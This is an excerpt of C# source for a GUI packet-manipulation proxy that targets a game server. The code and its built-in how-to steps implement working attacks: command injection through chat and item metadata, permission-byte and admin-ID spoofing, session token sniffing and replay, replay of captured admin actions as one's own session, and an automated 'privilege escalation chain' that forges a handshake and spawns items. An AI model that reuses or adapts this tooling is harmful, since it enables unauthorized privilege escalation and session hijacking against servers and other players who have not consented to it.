            if (_ciChatHex.Length > 0)
            {
                try
                {
                    byte[] b = BuildChatAppendPacket(HexToBytes(_ciChatHex), _ciCommand, _ciNullDelimit);
                    UiHelper.MutedLabel($"Preview ({b.Length}b): {BytesToHex(b, 32)}...");
                }
                catch { UiHelper.MutedLabel("(invalid hex)"); }
            }

            ImGui.Spacing();
            UiHelper.WarnButton("Send Appended Chat Packet##casend", 260, 32, () =>
            {
                if (string.IsNullOrWhiteSpace(_ciChatHex))
                { _log.Error("[CmdInject/Chat] Paste a base chat packet hex first."); return; }
                try
                {
                    byte[] pkt = BuildChatAppendPacket(
                        HexToBytes(_ciChatHex), ResolveTarget(_ciCommand), _ciNullDelimit);
                    SendRaw(pkt);
                    _log.Info($"[CmdInject/Chat] {pkt.Length}b sent - inject: '{ResolveTarget(_ciCommand)}'");
                }
                catch (Exception ex) { _log.Error($"[CmdInject/Chat] {ex.Message}"); }
            });

            ImGui.Spacing();
            RenderHowTo(
                "1. Capture a normal chat message packet in Capture tab",
                "2. Paste its hex above (or load from Packet Book)",
                "3. Set inject string to /op or /gamemode creative",
                "4. Send - if the server splits on \\0 or \\n it may execute both");
        });
    }

    private void RenderCommandInjectItemEmbed(float w)
    {
        UiHelper.SectionBox("ITEM METADATA COMMAND EMBED", w, 260, () =>
        {
            UiHelper.MutedLabel("Embeds a hidden command string inside an item use/pickup packet.");
            UiHelper.MutedLabel("Exploits parsers that execute strings found in item name/lore metadata.");
            ImGui.Spacing();

            UiHelper.MutedLabel("Item packet hex:");
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("##ciitem", ref _ciItemHex, 1024);

            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("Command to embed##ciembed", ref _ciCommand, 256);
            ImGui.Checkbox("Null-byte before command##ciembnd", ref _ciNullDelimit);
            ImGui.Spacing();

            UiHelper.WarnButton("Send Item+Embed##ciembsend", 220, 32, () =>
            {
                if (string.IsNullOrWhiteSpace(_ciItemHex))
                { _log.Error("[CmdInject/Item] Paste an item packet hex first."); return; }
                try
                {
                    byte[] pkt = BuildItemEmbedPacket(
                        HexToBytes(_ciItemHex), ResolveTarget(_ciCommand), _ciNullDelimit);
                    SendRaw(pkt);
                    _log.Info($"[CmdInject/Item] {pkt.Length}b sent - embedded: '{ResolveTarget(_ciCommand)}'");
                }
                catch (Exception ex) { _log.Error($"[CmdInject/Item] {ex.Message}"); }
            });
        });
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: METADATA INJECT
    // ══════════════════════════════════════════════════════════════════════

    private void RenderMetadataInject(float w)
    {
        UiHelper.SectionBox("ITEM METADATA INJECTION", w, 370, () =>
        {
            UiHelper.MutedLabel("Locates the string region in an item packet and appends a hidden payload.");
            UiHelper.MutedLabel("Targets: item name, lore, enchant description - any UTF-8 string in the packet.");
            ImGui.Spacing();

            UiHelper.MutedLabel("Base item packet (hex):");
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("##mibase", ref _miBaseHex, 2048);

            var saved = _store.GetAll();
            if (saved.Count > 0 && ImGui.BeginCombo("Load from Book##mibook", ""))
            {
                foreach (var s in saved)
                {
                    if (ImGui.Selectable(s.Label)) _miBaseHex = s.HexString;
                }
                ImGui.EndCombo();
            }

            ImGui.Spacing();

            ImGui.SetNextItemWidth(90);
            ImGui.InputInt("String search offset##misoff", ref _miSearchOffset);
            _miSearchOffset = Math.Max(0, _miSearchOffset);
            ImGui.SameLine(0, 8);
            UiHelper.MutedLabel("Byte offset to begin scanning for ASCII string regions");

            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("Inject payload##mistr", ref _miInjectStr, 256);
            ImGui.SameLine(0, 6);
            InlineAutoFill("##miaf", () =>
            {
                _miInjectStr = ResolveTarget(_miInjectStr);
            });

            ImGui.Checkbox("Append (true) / overwrite (false)##miapp", ref _miAppend);
            ImGui.Checkbox("Null-terminate injection##mint", ref _miNullTerm);
            ImGui.Spacing();

            // Live preview
            if (_miBaseHex.Length > 0)
            {
                try
                {
                    byte[] b = _miBaseHex.Length > 0 ? HexToBytes(_miBaseHex) : Array.Empty<byte>();
                    byte[] mutated = MutateItemMetadata(b, ResolveTarget(_miInjectStr), _miAppend, _miNullTerm, _miSearchOffset);
                    _miPreview = $"Result: {mutated.Length}b  |  {BytesToHex(mutated, 40)}";
                }
                catch { _miPreview = "(invalid hex)"; }
            }

            if (_miPreview.Length > 0)
            {
                ImGui.PushStyleColor(ImGuiCol.Text, MenuRenderer.ColBlue);
                ImGui.TextWrapped(_miPreview);
                ImGui.PopStyleColor();
            }

            ImGui.Spacing();
            UiHelper.WarnButton("Send Mutated Item Packet##misend", 250, 32, () =>
            {
                if (string.IsNullOrWhiteSpace(_miBaseHex))
                { _log.Error("[MetaInject] Paste a base item packet first."); return; }
                try
                {
                    byte[] b       = HexToBytes(_miBaseHex);
                    byte[] mutated = MutateItemMetadata(b, ResolveTarget(_miInjectStr),
                                                        _miAppend, _miNullTerm, _miSearchOffset);
                    SendRaw(mutated);
                    _log.Success($"[MetaInject] {mutated.Length}b sent - inject: '{ResolveTarget(_miInjectStr)}'");
                }
                catch (Exception ex) { _log.Error($"[MetaInject] {ex.Message}"); }
            });

            ImGui.Spacing();
            RenderHowTo(
                "1. Pick up or use an item in-game while the proxy is running",
                "2. Find the resulting packet in Capture / Item Inspector tab",
                "3. Save it to Packet Book, then load it here",
                "4. Adjust 'String offset' until the preview shows your item name region",
                "5. Set inject payload to /op or /gamemode, send, watch server logs",
                "6. Command executed = item metadata not sanitised server-side");
        });
    }

    /// <summary>
    /// Find the first ASCII string region starting at or after <paramref name="searchOffset"/>
    /// and append (or overwrite) the inject string there.
    /// </summary>
    private static byte[] MutateItemMetadata(byte[] data, string inject,
                                              bool append, bool nullTerm, int searchOffset)
    {
        var copy = new List<byte>(data);

        // Find the first run of printable ASCII >= 3 chars, starting at searchOffset
        int strStart = -1, strEnd = -1;
        for (int i = searchOffset; i < copy.Count; i++)
        {
            if (copy[i] >= 32 && copy[i] < 127)
            {
                if (strStart < 0) strStart = i;
                strEnd = i;
            }
            else if (strStart >= 0 && (strEnd - strStart + 1) >= 3)
            {
                break; // found a string run of at least 3 chars
            }
            else
            {
                strStart = -1;
            }
        }

        byte[] injectBytes = Encoding.UTF8.GetBytes(inject);
        var payload = new List<byte>();
        if (nullTerm) payload.Add(0x00);
        payload.AddRange(injectBytes);

        if (strStart < 0)
        {
            // No string found - just append at end
            copy.AddRange(payload);
        }
        else if (append)
        {
            // Insert after the string run
            copy.InsertRange(strEnd + 1, payload);
        }
        else
        {
            // Overwrite the string region from strStart
            int removeLen = Math.Min(payload.Count, copy.Count - strStart);
            copy.RemoveRange(strStart, removeLen);
            copy.InsertRange(strStart, payload);
        }

        return copy.ToArray();
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: PERM SPOOF
    // ══════════════════════════════════════════════════════════════════════

    private void RenderPermSpoof(float w)
    {
        UiHelper.SectionBox("PERMISSION LEVEL SPOOF", w, 300, () =>
        {
            UiHelper.MutedLabel("Prepend a raw permission-level byte (and optionally a PlayerID header)");
            UiHelper.MutedLabel("to any captured packet. Tests per-packet auth validation.");
            ImGui.Spacing();

            ImGui.Checkbox("Prepend permission byte##pse", ref _psEnabled);
            ImGui.BeginDisabled(!_psEnabled);
            ImGui.SetNextItemWidth(100);
            ImGui.InputInt("Level##psl", ref _psLevel);
            _psLevel = Math.Clamp(_psLevel, 0, 255);
            ImGui.SameLine(0, 8);
            ImGui.PushStyleColor(ImGuiCol.Text, PermColor(_psLevel));
            ImGui.TextUnformatted($"{PermName(_psLevel)}  (0x{_psLevel:X2})");
            ImGui.PopStyleColor();
            ImGui.EndDisabled();

            ImGui.Spacing();
            ImGui.Checkbox("Also prepend Admin PlayerID##pswid", ref _psWrapWithId);
            ImGui.BeginDisabled(!_psWrapWithId);
            ImGui.SetNextItemWidth(130);
            ImGui.InputInt("Admin ID##pswpid", ref _psWrappedId);
            ImGui.SameLine(0, 6);
            if (_targetPlayerId > 0)
            {
                UiHelper.SecondaryButton($"Use sidebar ({_targetPlayerId})##psuse",
                    180, 22, () => _psWrappedId = _targetPlayerId);
            }
            ImGui.EndDisabled();

            ImGui.Spacing();
            UiHelper.MutedLabel("Packet hex to send:");
            ImGui.SetNextItemWidth(-1);
            ImGui.InputText("##pshex", ref _psHex, 2048);

            var saved = _store.GetAll();
            if (saved.Count > 0 && ImGui.BeginCombo("Load##psbook", ""))
            {
                foreach (var s in saved)
                    if (ImGui.Selectable(s.Label)) _psHex = s.HexString;
                ImGui.EndCombo();
            }

            ImGui.Spacing();

            // Preview
            if (_psHex.Length > 0)
            {
                try
                {
                    byte[] b = BuildSpoofedPermPacket(HexToBytes(_psHex));
                    UiHelper.MutedLabel($"Preview ({b.Length}b): {BytesToHex(b, 28)}...");
                }
                catch { }
            }

            ImGui.Spacing();
            UiHelper.WarnButton("Send Spoofed Packet##pssend", 220, 32, () =>
            {
                if (string.IsNullOrWhiteSpace(_psHex))
                { _log.Error("[PermSpoof] Paste a packet hex first."); return; }
                try
                {
                    byte[] raw  = HexToBytes(_psHex);
                    byte[] pkt  = BuildSpoofedPermPacket(raw);
                    SendRaw(pkt);
                    _log.Success($"[PermSpoof] {pkt.Length}b sent - prefix: {BytesToHex(pkt, 8)}...");
                }
                catch (Exception ex) { _log.Error($"[PermSpoof] {ex.Message}"); }
            });

            ImGui.Spacing();
            RenderHowTo(
                "1. Capture any packet from the Capture tab",
                "2. Paste its hex above (or load from Packet Book)",
                "3. Enable 'Prepend permission byte', set level to 3 or 4",
                "4. Optionally also wrap with an admin PlayerID from the sidebar",
                "5. Send - watch if the server grants elevated rights for this packet");
        });
    }

    private byte[] BuildSpoofedPermPacket(byte[] raw)
    {
        var pkt = new List<byte>();
        if (_psWrapWithId && _psWrappedId > 0)
            pkt.AddRange(BitConverter.GetBytes(_psWrappedId));
        if (_psEnabled)
            pkt.Add((byte)_psLevel);
        pkt.AddRange(raw);
        return pkt.ToArray();
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: TOKEN SNIFF
    // ══════════════════════════════════════════════════════════════════════

    private void RenderTokenSniff(float w)
    {
        UiHelper.SectionBox("AUTH / SESSION TOKEN SNIFFER", w, 80, () =>
        {
            UiHelper.MutedLabel("Automatically extracts high-entropy token candidates from captured packets.");
            UiHelper.MutedLabel("Captures session tokens, auth keys, and handshake secrets for replay testing.");
            ImGui.Spacing();
            UiHelper.SecondaryButton("Re-Scan##tokscan", 120, 26, () =>
            {
                _tokens.Clear();
                ScanTokensAndAdminActions(_capture.GetPackets());
                _log.Info($"[Tokens] Scan complete - {_tokens.Count} token candidates found.");
            });
            ImGui.SameLine(0, 8);
            UiHelper.MutedLabel($"{_tokens.Count} candidates found");
        });

        ImGui.Spacing();

        float tableH = ImGui.GetContentRegionAvail().Y - 100;
        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg1);
        ImGui.BeginChild("##tok_list", new Vector2(w, tableH), ImGuiChildFlags.Border);
        ImGui.PopStyleColor();

        UiHelper.MutedLabel($"  {"Dir",-5} {"Opcode",-8} {"Offset",-7} {"Len",-5} Token hex");
        var dlh = ImGui.GetWindowDrawList();
        float hy = ImGui.GetCursorScreenPos().Y - 1;
        dlh.AddLine(new Vector2(ImGui.GetWindowPos().X, hy),
                    new Vector2(ImGui.GetWindowPos().X + w, hy),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColBorder));

        if (_tokens.Count == 0)
        {
            ImGui.SetCursorPosX(12);
            UiHelper.MutedLabel("No token candidates yet - capture traffic while logging in/joining.");
        }

        for (int ti = 0; ti < _tokens.Count; ti++)
        {
            var t   = _tokens[ti];
            bool sel = _tokSelectedIdx == ti;

            if (sel)
            {
                var sp = ImGui.GetCursorScreenPos();
                ImGui.GetWindowDrawList().AddRectFilled(sp, sp + new Vector2(w, 22),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColAccentDim));
            }

            var dirCol = t.Direction == PacketDirection.ClientToServer
                ? MenuRenderer.ColBlue : MenuRenderer.ColAccent;

            ImGui.PushStyleColor(ImGuiCol.Text, dirCol);
            ImGui.TextUnformatted($"  {(t.Direction == PacketDirection.ClientToServer ? "C->S" : "S->C"),-5}");
            ImGui.PopStyleColor();
            ImGui.SameLine(0, 4);
            UiHelper.MutedLabel($" 0x{t.Opcode:X2}   +{t.Offset,-6} {t.TokenBytes.Length,-5}");
            ImGui.SameLine(0, 4);
            ImGui.PushStyleColor(ImGuiCol.Text, new Vector4(0.6f, 1f, 0.6f, 1f));
            string preview = BytesToHex(t.TokenBytes, 20);
            ImGui.TextUnformatted(preview);
            ImGui.PopStyleColor();

            // Buttons
            ImGui.SameLine(w - 160);
            UiHelper.SecondaryButton($"Copy##tokcopy{ti}", 50, 18, () =>
            {
                ImGui.SetClipboardText(BytesToHex(t.TokenBytes, t.TokenBytes.Length));
                _log.Info($"[Tokens] Copied {t.TokenBytes.Length}b token (0x{t.Opcode:X2}).");
            });
            ImGui.SameLine(0, 4);
            UiHelper.WarnButton($"Replay##tokrep{ti}", 65, 18, () =>
            {
                _tokSelectedIdx = ti;
                SendRaw(t.FullPacket);
                _log.Info($"[Tokens] Replayed full packet (0x{t.Opcode:X2} {t.FullPacket.Length}b).");
                AlertBus.Push(AlertBus.Sec_Privilege, AlertLevel.Warn,
                    $"Token replayed: 0x{t.Opcode:X2} {t.TokenBytes.Length}b");
            });
            ImGui.SameLine(0, 4);
            if (ImGui.Selectable($"##toksel{ti}", sel, ImGuiSelectableFlags.None, new Vector2(0, 22)))
                _tokSelectedIdx = ti;
        }

        ImGui.EndChild();

        if (_tokSelectedIdx >= 0 && _tokSelectedIdx < _tokens.Count)
        {
            var t = _tokens[_tokSelectedIdx];
            ImGui.Spacing();
            UiHelper.SectionBox("SELECTED TOKEN ACTIONS", w, 70, () =>
            {
                UiHelper.MutedLabel($"Token: {BytesToHex(t.TokenBytes, t.TokenBytes.Length)}");
                UiHelper.MutedLabel($"Full packet ({t.FullPacket.Length}b): {BytesToHex(t.FullPacket, 32)}");
                ImGui.Spacing();
                UiHelper.WarnButton("Replay Full Packet##tokrepfull", 180, 26, () =>
                {
                    SendRaw(t.FullPacket);
                    _log.Info($"[Tokens] Replayed 0x{t.Opcode:X2} {t.FullPacket.Length}b.");
                });
                ImGui.SameLine(0, 8);
                UiHelper.SecondaryButton("Send to Handshake Tamper##tok2hs", 220, 26, () =>
                {
                    _hsCapturedHex  = BytesToHex(t.FullPacket, t.FullPacket.Length);
                    _hsReuseCapture = true;
                    _subTab         = 1;
                    _log.Info("[Tokens] Token loaded into Handshake Tamper.");
                });
            });
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: SPAWN ITEMS
    // ══════════════════════════════════════════════════════════════════════

    private void RenderSpawnItems(float w)
    {
        UiHelper.SectionBox("ADMIN ITEM SPAWN - MULTI-METHOD TESTER", w, 200, () =>
        {
            UiHelper.MutedLabel("Tests item spawning/giving through every available attack vector.");
            UiHelper.MutedLabel("Iterates raw packets, command variants, and admin-session wrapping.");
            ImGui.Spacing();

            float half = (w - 20) * 0.5f;

            // Item config
            ImGui.SetNextItemWidth(130); ImGui.InputInt("Item ID##spid", ref _spawnItemId);
            _spawnItemId = Math.Max(1, _spawnItemId);
            ImGui.SameLine(0, 6);
            InlineAutoFill("##spaf", () =>
            {
                var f = ContextFiller.Fill(_capture, _udpProxy);
                if (f.HasItem) _spawnItemId = (int)f.ItemId!.Value;
            });
            ImGui.SameLine(0, 16);
            ImGui.SetNextItemWidth(100); ImGui.InputInt("Count##spcnt", ref _spawnCount);
            _spawnCount = Math.Clamp(_spawnCount, 1, 9999);

            ImGui.SetNextItemWidth(140); ImGui.InputInt("Target Player ID##sptid", ref _spawnTargetId);
            ImGui.SameLine(0, 8);
            if (_targetPlayerId > 0)
            {
                UiHelper.SecondaryButton($"Use sidebar ({_targetPlayerId})##spuse", 180, 22,
                    () => { _spawnTargetId = _targetPlayerId; _spawnTargetName = _targetPlayerName; });
            }

            // Method
            ImGui.Spacing();
            ImGui.SetNextItemWidth(-1);
            ImGui.Combo("Method##spmth", ref _spawnMethod, SpawnMethods, SpawnMethods.Length);

            if (_spawnMethod == 5)
            {
                ImGui.SetNextItemWidth(-1);
                ImGui.InputText("Custom cmd (use {item},{count},{target})##spcmd", ref _spawnCustomCmd, 256);
            }
            ImGui.Spacing();

            ImGui.Checkbox("Repeat##sprep", ref _spawnRepeatMode);
            if (_spawnRepeatMode)
            {
                ImGui.SameLine(0, 8);
                ImGui.SetNextItemWidth(80); ImGui.InputInt("N##sprepn", ref _spawnRepeatN);
                _spawnRepeatN = Math.Clamp(_spawnRepeatN, 1, 200);
                ImGui.SameLine(0, 8);
                ImGui.SetNextItemWidth(80); ImGui.InputInt("ms##sprep_d", ref _spawnRepeatDelay);
                _spawnRepeatDelay = Math.Max(0, _spawnRepeatDelay);
            }
        });

        ImGui.Spacing();

        // Action buttons
        float btnW = (w - 30) / 3f;
        UiHelper.WarnButton("Spawn via Packet##sprun_pkt", btnW, 34,
            () => ExecuteSpawn(0));
        ImGui.SameLine(0, 8);
        UiHelper.WarnButton("/give Command##sprun_give", btnW, 34,
            () => ExecuteSpawn(1));
        ImGui.SameLine(0, 8);
        UiHelper.WarnButton("Try ALL Methods##sprun_all", btnW, 34,
            () => { for (int m = 0; m < SpawnMethods.Length - 1; m++) ExecuteSpawn(m); });

        if (_spawnMethod == 5)
        {
            ImGui.Spacing();
            UiHelper.WarnButton("Send Custom Command##sprun_cust", 220, 30,
                () => ExecuteSpawn(5));
        }

        ImGui.Spacing();

        // Privilege escalation chain
        UiHelper.SectionBox("PRIVILEGE ESCALATION CHAIN", w, 100, () =>
        {
            UiHelper.MutedLabel("Combines handshake tamper + session spoof + item spawn in sequence.");
            UiHelper.MutedLabel("Step 1: forge elevated handshake  Step 2: spoof admin session  Step 3: spawn item");
            ImGui.Spacing();
            UiHelper.WarnButton("Run Full Chain##spchain", 220, 32, () =>
            {
                Task.Run(async () =>
                {
                    _log.Info("[SpawnChain] Starting full privilege escalation chain...");

                    // Step 1: Forge handshake
                    byte[] hsPacket = BuildHandshakePacket();
                    SendRaw(hsPacket);
                    _log.Info($"[SpawnChain] Step 1: Forged handshake (perm={_hsPermLevel}) sent.");
                    await Task.Delay(300);

                    // Step 2: Spoof session with admin ID
                    uint adminId = _spawnTargetId > 0 ? (uint)_spawnTargetId
                                 : _targetPlayerId > 0 ? (uint)_targetPlayerId : 1u;

                    // Step 3: Spawn item
                    var itemPkt = new List<byte> { 0x2A };
                    itemPkt.AddRange(BitConverter.GetBytes((uint)_spawnItemId));
                    itemPkt.AddRange(BitConverter.GetBytes((uint)_spawnCount));
                    itemPkt.AddRange(BitConverter.GetBytes(adminId));
                    byte[] wrapped = WrapWithPlayerId(adminId, itemPkt.ToArray(), true);
                    SendRaw(wrapped);
                    _log.Info($"[SpawnChain] Step 3: Wrapped give-item sent (ItemID={_spawnItemId}x{_spawnCount} -> PlayerID={adminId}).");
                    await Task.Delay(200);

                    // Step 4: Command variant
                    string target = _spawnTargetName.Length > 0 ? _spawnTargetName : adminId.ToString();
                    string cmd    = $"/give {target} {_spawnItemId} {_spawnCount}";
                    SendRaw(BuildChatPacket(cmd, false));
                    _log.Success($"[SpawnChain] Chain complete. Check inventory and server response.");
                    AlertBus.Push(AlertBus.Sec_Privilege, AlertLevel.Critical,
                        $"Escalation chain fired: item {_spawnItemId}x{_spawnCount}");
                });
            });

            ImGui.SameLine(0, 12);
            UiHelper.MutedLabel("Tests all privilege bypass techniques simultaneously.");
        });

        ImGui.Spacing();
        RenderHowTo(
            "1. Auto-fill item ID from Item Inspector ([~] button) or enter manually",
            "2. Set target Player ID (yourself = 0, admin target = use sidebar)",
            "3. Try 'Try ALL Methods' - this fires every known spawn technique",
            "4. ANY method that puts the item in inventory = server-side vulnerability",
            "5. Use 'Run Full Chain' to combine handshake tamper + session spoof + spawn",
            "6. Document successful vectors in Protocol Map for future reference");
    }

    private void ExecuteSpawn(int method)
    {
        int targetId = _spawnTargetId > 0 ? _spawnTargetId
                     : _targetPlayerId > 0 ? _targetPlayerId : 0;
        string targetName = _spawnTargetName.Length > 0 ? _spawnTargetName
                          : _targetPlayerName.Length > 0 ? _targetPlayerName
                          : targetId > 0 ? targetId.ToString() : "@p";

        int repeatN = _spawnRepeatMode ? _spawnRepeatN : 1;
        int delay   = _spawnRepeatDelay;

        Task.Run(async () =>
        {
            for (int r = 0; r < repeatN; r++)
            {
                byte[]? pkt = null;
                string  desc;

                switch (method)
                {
                    case 0: // Raw 0x2A give packet
                        var raw = new List<byte> { 0x2A };
                        raw.AddRange(BitConverter.GetBytes(_spawnItemId));
                        raw.AddRange(BitConverter.GetBytes(_spawnCount));
                        raw.AddRange(BitConverter.GetBytes(targetId));
                        pkt  = raw.ToArray();
                        desc = $"0x2A packet (item={_spawnItemId}x{_spawnCount} -> {targetId})";
                        break;
                    case 1: // /give
                        pkt  = BuildChatPacket($"/give {targetName} {_spawnItemId} {_spawnCount}", false);
                        desc = $"/give {targetName} {_spawnItemId} {_spawnCount}";
                        break;
                    case 2: // /i
                        pkt  = BuildChatPacket($"/i {_spawnItemId} {_spawnCount}", false);
                        desc = $"/i {_spawnItemId} {_spawnCount}";
                        break;
                    case 3: // /spawnitem
                        pkt  = BuildChatPacket($"/spawnitem {_spawnItemId} {_spawnCount}", false);
                        desc = $"/spawnitem {_spawnItemId} {_spawnCount}";
                        break;
                    case 4: // /item
                        pkt  = BuildChatPacket($"/item {_spawnItemId} {_spawnCount}", false);
                        desc = $"/item {_spawnItemId} {_spawnCount}";
                        break;
                    case 5: // Custom
                        string cmd = _spawnCustomCmd
                            .Replace("{item}", _spawnItemId.ToString())
                            .Replace("{count}", _spawnCount.ToString())
                            .Replace("{target}", targetName);
                        pkt  = BuildChatPacket(cmd, false);
                        desc = cmd;
                        break;
                    default:
                        return;
                }

                if (pkt != null)
                {
                    SendRaw(pkt);
                    _log.Info($"[SpawnItems] [{SpawnMethods[method]}] {desc} {(repeatN > 1 ? $"({r+1}/{repeatN})" : "")}");
                }

                if (delay > 0 && r < repeatN - 1)
                    await Task.Delay(delay);
            }
            _log.Success($"[SpawnItems] Done - method '{SpawnMethods[method]}'x {repeatN}");
        });
    }

    // ══════════════════════════════════════════════════════════════════════
    // SUB-TAB: ADMIN REPLAY
    // ══════════════════════════════════════════════════════════════════════

    private void RenderAdminReplay(float w)
    {
        // Refresh admin action list on new packets
        var pkts = _capture.GetPackets();
        if (pkts.Count != _arLastPktCount)
        {
            ScanTokensAndAdminActions(pkts);
            _arLastPktCount = pkts.Count;
        }

        UiHelper.SectionBox("ADMIN ACTION INTERCEPTOR", w, 80, () =>
        {
            UiHelper.MutedLabel("Captures packets that appear to come from or affect admin players.");
            UiHelper.MutedLabel("Replay them as yourself to test if admin-only actions are sender-validated.");
            ImGui.Spacing();
            UiHelper.SecondaryButton("Re-Scan##arrescan", 120, 26, () =>
            {
                _adminActions.Clear();
                ScanTokensAndAdminActions(_capture.GetPackets());
                _log.Info($"[AdminReplay] {_adminActions.Count} admin action candidates found.");
            });
            ImGui.SameLine(0, 8);
            UiHelper.MutedLabel($"{_adminActions.Count} actions detected");
        });

        ImGui.Spacing();

        // Action list
        float listH = ImGui.GetContentRegionAvail().Y - 90;
        ImGui.PushStyleColor(ImGuiCol.ChildBg, MenuRenderer.ColBg1);
        ImGui.BeginChild("##ar_list", new Vector2(w, listH), ImGuiChildFlags.Border);
        ImGui.PopStyleColor();

        UiHelper.MutedLabel($"  {"#",-3} {"Dir",-5} {"Op",-6} {"Size",-6} {"At",-10} Reason");
        var dlh = ImGui.GetWindowDrawList();
        float hy = ImGui.GetCursorScreenPos().Y - 1;
        dlh.AddLine(new Vector2(ImGui.GetWindowPos().X, hy),
                    new Vector2(ImGui.GetWindowPos().X + w, hy),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColBorder));

        if (_adminActions.Count == 0)
        {
            ImGui.SetCursorPosX(12);
            UiHelper.MutedLabel("No admin actions captured yet.");
            ImGui.SetCursorPosX(12);
            UiHelper.MutedLabel("Capture traffic while an admin is online and active.");
        }

        for (int ai = 0; ai < _adminActions.Count; ai++)
        {
            var  action = _adminActions[ai];
            bool sel    = _arSelectedIdx == ai;

            if (sel)
            {
                var sp = ImGui.GetCursorScreenPos();
                ImGui.GetWindowDrawList().AddRectFilled(sp, sp + new Vector2(w, 22),
                    ImGui.ColorConvertFloat4ToU32(MenuRenderer.ColWarnDim));
            }

            var dirCol = action.Direction == PacketDirection.ClientToServer
                ? MenuRenderer.ColBlue : MenuRenderer.ColAccent;

            ImGui.PushStyleColor(ImGuiCol.Text, dirCol);
            ImGui.TextUnformatted($"  [{ai+1,-2}] {(action.Direction == PacketDirection.ClientToServer ? "C->S" : "S->C"),-5}");
            ImGui.PopStyleColor();
            ImGui.SameLine(0, 4);
            UiHelper.MutedLabel($"0x{action.Opcode:X2}   {action.Data.Length,-6} {action.At:HH:mm:ss,-10} {action.Reason}");

            // Replay inline
            ImGui.SameLine(w - 75);
            UiHelper.WarnButton($">##arrep{ai}", 30, 18, () =>
            {
                _arSelectedIdx = ai;
                DoReplay(action);
            });
            ImGui.SameLine(0, 2);
            UiHelper.SecondaryButton($"->HS##ar2hs{ai}", 40, 18, () =>
            {
                _hsCapturedHex  = BytesToHex(action.Data, action.Data.Length);
                _hsReuseCapture = true;
                _subTab         = 1;
            });

            if (ImGui.Selectable($"##arsel{ai}", sel, ImGuiSelectableFlags.None, new Vector2(w - 82, 22)))
                _arSelectedIdx = ai;
        }

        ImGui.EndChild();

        // Selected action detail + controls
        if (_arSelectedIdx >= 0 && _arSelectedIdx < _adminActions.Count)
        {
            var action = _adminActions[_arSelectedIdx];
            ImGui.Spacing();
            UiHelper.SectionBox("REPLAY CONTROLS", w, 80, () =>
            {
                UiHelper.MutedLabel($"Packet: {BytesToHex(action.Data, 40)}");
                ImGui.Spacing();
                ImGui.SetNextItemWidth(80); ImGui.InputInt("Count##arrc", ref _arReplayCount);
                _arReplayCount = Math.Clamp(_arReplayCount, 1, 500);
                ImGui.SameLine(0, 8);
                ImGui.SetNextItemWidth(80); ImGui.InputInt("Delay ms##arrd", ref _arReplayDelay);
                _arReplayDelay = Math.Max(0, _arReplayDelay);
                ImGui.SameLine(0, 12);
                UiHelper.WarnButton($"Replayx{_arReplayCount}##arrepN", 140, 28, () =>
                {
                    int count = _arReplayCount, delay = _arReplayDelay;
                    var data  = action.Data;
                    Task.Run(async () =>
                    {
                        for (int r = 0; r < count; r++)
                        {
                            SendRaw(data);
                            _log.Info($"[AdminReplay] #{r+1}/{count}: 0x{data[0]:X2} {data.Length}b");
                            if (delay > 0) await Task.Delay(delay);
                        }
                        _log.Success($"[AdminReplay] Donex {count}.");
                        AlertBus.Push(AlertBus.Sec_Privilege, AlertLevel.Warn,
                            $"Admin action replayedx{count}: 0x{data[0]:X2}");
                    });
                });
            });
        }

        ImGui.Spacing();
        RenderHowTo(
            "1. Start proxy in Capture tab",
            "2. Have an admin online - watch them perform privileged actions",
            "3. Their action packets appear here, flagged by opcode / ID patterns",
            "4. Select an action and click > to replay it as your session",
            "5. Server accepts = it validates sender-side only at login, not per-packet",
            "6. Use '->HS' to load the packet into Handshake Tamper for deeper mutation");
    }

    private void DoReplay(AdminActionEntry action)
    {
        SendRaw(action.Data);
        _log.Info($"[AdminReplay] Replayed 0x{action.Opcode:X2} {action.Data.Length}b.");
    }

    // ══════════════════════════════════════════════════════════════════════
    // TOKEN + ADMIN ACTION SCANNER
    // ══════════════════════════════════════════════════════════════════════

    private void ScanTokensAndAdminActions(List<CapturedPacket> packets)
    {
        var newPkts = packets.Skip(Math.Max(0, packets.Count - 100)).ToList();

        foreach (var pkt in newPkts)
        {
            if (pkt.RawBytes.Length < 8) continue;

            // ── Token detection: high-entropy runs of >= 16 consecutive bytes ──
            int runStart = -1, runLen = 0;
            for (int i = 1; i < pkt.RawBytes.Length; i++)
            {
                byte b = pkt.RawBytes[i];
                bool isHighEntropy = (b > 0x1F && b < 0x7F) || b > 0x9F;
                if (isHighEntropy) { if (runStart < 0) runStart = i; runLen++; }
                else
                {
                    if (runLen >= 16)
                    {
                        byte[] tokenBytes = new byte[runLen];
                        Array.Copy(pkt.RawBytes, runStart, tokenBytes, 0, runLen);
                        float entropy = ShannonEntropy(tokenBytes);
                        if (entropy > 3.5f && !_tokens.Any(t =>
                            t.Opcode == pkt.RawBytes[0] && t.Offset == runStart))
                        {
                            _tokens.Add(new TokenEntry
                            {
                                Opcode     = pkt.RawBytes[0],
                                Direction  = pkt.Direction,
                                Offset     = runStart,
                                TokenBytes = tokenBytes,
                                FullPacket = (byte[])pkt.RawBytes.Clone(),
                                At         = pkt.Timestamp,
                            });
                        }
                    }
                    runStart = -1; runLen = 0;
                }
            }

            // ── Admin action detection: opcodes associated with admin commands ──
            byte op = pkt.RawBytes[0];
            bool isAdminOpcode =
                op == 0x50 || op == 0x51 || op == 0x52 ||   // typical admin ops
                op == 0x60 || op == 0x61 || op == 0x70 ||
                op == 0x2A ||                                  // give item
                (op == 0x01 && pkt.RawBytes.Length > 3 &&     // chat with / = command
                 pkt.RawBytes[3] == '/');

            if (isAdminOpcode && !_adminActions.Any(a =>
                a.Opcode == op && a.Data.Length == pkt.RawBytes.Length &&
                a.Data.SequenceEqual(pkt.RawBytes)))
            {
                string reason = op switch
                {
                    0x2A => "Give/spawn item packet",
                    0x01 => "Command packet (/ prefix)",
                    0x50 or 0x51 or 0x52 => "Admin opcode range (0x50-0x52)",
                    0x60 or 0x61 => "Admin opcode range (0x60-0x61)",
